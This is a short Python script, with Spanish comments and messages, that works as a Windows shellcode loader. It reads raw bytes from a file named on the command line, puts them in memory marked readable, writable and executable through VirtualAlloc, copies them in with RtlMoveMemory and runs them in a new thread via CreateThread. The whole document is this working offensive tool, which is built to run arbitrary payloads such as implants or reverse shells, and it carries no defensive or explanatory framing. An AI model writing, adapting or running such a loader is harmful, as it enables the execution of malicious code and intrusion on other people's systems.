#!/usr/bin/env python3
import sys
import ctypes
from ctypes import wintypes

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

def ejecutar_shellcode(ruta_bin):
    try:
        with open(ruta_bin, "rb") as f:
            sc = f.read()
    except Exception as e:
        print(f"[-] Error al leer archivo: {e}")
        return

    if not sc:
        print("[-] El archivo está vacío")
        return

    print(f"[+] Shellcode cargado: {len(sc)} bytes")

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

    # Configurar tipos de argumentos
    kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.VirtualAlloc.restype = wintypes.LPVOID
    ntdll.RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t]
    ntdll.RtlMoveMemory.restype = None
    kernel32.CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
    kernel32.CreateThread.restype = wintypes.HANDLE
    kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

    # Reservar memoria RWX
    ptr = kernel32.VirtualAlloc(None, len(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        err = ctypes.get_last_error()
        print(f"[-] VirtualAlloc falló. Error: {err} (0x{err:08X})")
        return

    print(f"[*] Memoria reservada en: {hex(ptr)}")

    # Copiar shellcode con RtlMoveMemory (más fiable que memmove)
    ntdll.RtlMoveMemory(ptr, sc, len(sc))
    print("[*] Shellcode copiado")

    # Ejecutar en un hilo
    thread_id = wintypes.DWORD()
    h_thread = kernel32.CreateThread(None, 0, ptr, None, 0, ctypes.byref(thread_id))
    if not h_thread:
        err = ctypes.get_last_error()
        kernel32.VirtualFree(ptr, 0, 0x8000)
        print(f"[-] CreateThread falló. Error: {err} (0x{err:08X})")
        return

    print(f"[+] Shellcode ejecutándose en hilo ID: {thread_id.value}")
    kernel32.WaitForSingleObject(h_thread, INFINITE)
    kernel32.CloseHandle(h_thread)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python shell.py <ruta_del_archivo.bin>")
        sys.exit(1)
    ejecutar_shellcode(sys.argv[1])
